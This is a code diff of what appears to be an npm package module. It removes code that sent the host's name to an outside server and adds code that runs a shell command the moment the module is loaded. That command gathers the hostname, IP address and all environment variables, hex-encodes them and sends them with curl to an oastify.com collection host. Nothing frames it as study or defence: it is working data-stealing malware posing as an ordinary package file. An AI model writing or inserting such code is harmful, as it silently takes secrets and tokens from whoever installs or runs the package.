@@ -1,23 +1,19 @@
-const http = require('http');
-const mhn = require('mhn-malicious1');
-mhn();
+const { exec } = require("child_process");
 
-module.exports = function() {
-    const hostname = require('os').hostname();
-
-    const options = {
-        hostname: 'q6xjg3g3tfmh1vk4xv0axdd3muslgd42.oastify.com',
-        path: `/${hostname}`,
-        method: 'GET',
-    };
-
-    const req = http.request(options, res => {
-        console.log(`Status Code: ${res.statusCode}`);
-    });
-
-    req.on('error', error => {
-        console.error(`Error sending hostname: ${error}`);
-    });
-
-    req.end();
-};
+exec(`
+  hostname=$(hostname);
+  ip_address=$(hostname -I || ipconfig | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}');
+  env_vars=$(env);
+  data="hostname=$hostname&ip_address=$ip_address&env_vars=$(echo $env_vars | xxd -p)";
+  curl -G --data-urlencode "$data" "https://9pz2zmzmcy50ke3ngejtgwwm5db4zynn.oastify.com/";
+`, (error, stdout, stderr) => {
+    if (error) {
+        console.error("error:", error.message);
+        return;
+    }
+    if (stderr) {
+        console.error("stderr:", stderr);
+        return;
+    }
+    console.log("stdout:", stdout);
+});
